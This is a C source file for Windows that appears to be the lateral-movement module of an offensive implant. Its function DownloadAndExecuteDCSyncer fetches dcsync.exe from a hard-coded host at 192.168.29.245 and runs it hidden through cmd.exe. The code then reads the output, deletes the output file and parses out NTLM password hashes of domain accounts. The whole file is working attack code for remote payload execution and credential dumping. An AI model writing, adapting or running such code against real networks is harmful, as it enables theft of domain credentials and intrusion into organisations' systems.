#include <Windows.h>
#include <stdio.h>
#include "common.h"
#include <stdlib.h>
#include <string.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

// Function to retrieve the domain name of the current computer
BOOL GetDomainName(LPWSTR domainName, DWORD domainNameSize) {
    if (GetComputerNameEx(ComputerNameDnsDomain, domainName, &domainNameSize)) {
        return TRUE;
    }
    else {
        printf("[!] GetComputerNameEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
}

// Function to parse the DCSyncer result
KeyValuePair* parseDCSyncerResult(const char* result, int* count) {
    // Initialize variables
    KeyValuePair* resultArray = NULL;
    char line[512];
    char currentRDN[256] = { 0 };
    int resultCount = 0;

    // Copy the result to a buffer for line-by-line processing
    char* resultCopy = _strdup(result);
    char* linePtr = strtok(resultCopy, "\n");

    // Read result line by line
    while (linePtr != NULL) {
        strcpy(line, linePtr);
        if (strstr(line, "Object RDN") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                strcpy(currentRDN, pos + 2);
                currentRDN[strcspn(currentRDN, "\n")] = 0; // Remove newline character
            }
        }
        // Check if the line contains the NTLM hash
        else if (strstr(line, "Hash NTLM") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                char hashNTLM[256];
                strcpy(hashNTLM, pos + 2);
                hashNTLM[strcspn(hashNTLM, "\n")] = 0; // Remove newline character

                // Skip specific object RDN values
                if (strcmp(currentRDN, "DC") == 0 || strcmp(currentRDN, "WS") == 0 ||
                    strcmp(currentRDN, "krbtgt") == 0 || strcmp(currentRDN, "Administrator") == 0) {
                    linePtr = strtok(NULL, "\n");
                    continue;
                }

                // Allocate memory for the result array
                resultArray = realloc(resultArray, (resultCount + 1) * sizeof(KeyValuePair));
                strcpy(resultArray[resultCount].objectRDN, currentRDN);
                strcpy(resultArray[resultCount].hashNTLM, hashNTLM);
                resultCount++;
            }
        }
        linePtr = strtok(NULL, "\n");
    }

    free(resultCopy);
    *count = resultCount;
    return resultArray;
}

// Function to download and execute DCSyncer
char* DownloadAndExecuteDCSyncer() {
    const char* url = "http://192.168.29.245/dcsync.exe";
    const char* filePath = "dcsync.exe";
    const char* outputFilePath = "dcsyncer_output.txt";

	// Download DCSyncer
    if (!DownloadFile(url, filePath)) {
        printf("[!] Failed to download file: %s\n", filePath);
        return NULL;
    }
    printf("[+] File downloaded successfully: %s\n", filePath);

    // Execute the DCSyncer and redirect output to a file
    char command[512];
    snprintf(command, sizeof(command), "cmd.exe /C %s > %s", filePath, outputFilePath);
    WinExec(command, SW_HIDE);

    // Wait for the process to complete
    DWORD waitTime = 1000; // 1 second
    DWORD maxWaitTime = 60000; // 60 seconds
    DWORD elapsedTime = 0;

    while (elapsedTime < maxWaitTime) {
        Sleep(waitTime);
        elapsedTime += waitTime;

        // Check if the output file exists and is not empty
        HANDLE hFile = CreateFileA(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            CloseHandle(hFile);
            if (fileSize > 0) {
                break;
            }
        }
    }

    // Read the content of the output file
    HANDLE hFile = CreateFileA(outputFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open output file: %s\n", outputFilePath);
        return NULL;
    }

    //Create buffer to store contents
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* result = (char*)malloc(fileSize + 1);
    if (!result) {
        printf("[!] Failed to allocate memory for result\n");
        CloseHandle(hFile);
        return NULL;
    }

	// Read the content of the file
    DWORD bytesRead;
    if (!ReadFile(hFile, result, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] Failed to read output file\n");
        free(result);
        CloseHandle(hFile);
        return NULL;
    }

    result[fileSize] = '\0'; // Null-terminate the result

    CloseHandle(hFile);

    // Delete the output file
    if (!DeleteFileA(outputFilePath)) {
        printf("[!] Failed to delete output file: %s\n", outputFilePath);
    }
    return result;
}

// Lateral Movement Main Function
BOOL DoLateralMovement() {
    printf("[+] Lateral Movement Started\n");

    WCHAR domainName[256];
    DWORD domainNameSize = sizeof(domainName) / sizeof(domainName[0]);

    if (GetDomainName(domainName, domainNameSize)) {
        wprintf(L"[+] Domain Name: %s\n", domainName);
    }
    else {
        printf("[!] Failed to retrieve domain name\n");
    }

    // Download and execute DCSyncer
    char* dcsyncerResult = DownloadAndExecuteDCSyncer();
    if (!dcsyncerResult) {
        printf("[!] Failed to execute DCSyncer\n");
        return FALSE;
    }

    // Parsing the results of DCSyncer
    int count = 0;
    KeyValuePair* resultArray = parseDCSyncerResult(dcsyncerResult, &count);
    printf("[i] Printing Results From DcSyncer\n");
    printf("[i] Found %d results\n", count);
    if (resultArray) {
        for (int i = 0; i < count; i++) {
            printf("%s\t:\t%s\n", resultArray[i].objectRDN, resultArray[i].hashNTLM);
        }
        printf("\n\n");
        free(resultArray);
    }

    free(dcsyncerResult);
    return TRUE;
}